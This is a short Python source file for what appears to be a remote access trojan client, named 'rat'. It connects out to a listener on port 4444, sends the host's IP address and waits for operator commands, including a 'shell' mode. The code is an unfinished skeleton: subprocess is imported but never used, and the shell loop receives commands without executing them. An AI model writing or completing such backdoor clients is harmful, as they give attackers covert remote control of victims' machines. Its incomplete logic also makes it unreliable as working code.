import socket, subprocess, os, platform


class CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        
    def connection(self):
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        information_send = socket.gethostbyname(socket.gethostname())
        sock.send(information_send.encode())
        
    def main_loop(self):
        while True:
            command = sock.recv(1024).decode()
            
            match command:
                
                case 'shell':
                    while 1:
                        command = sock.recv(1024).decode()
                        if command == 'exit':
                            break
                        
rat = CLIENT('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.connection()
    rat.main_loop()
 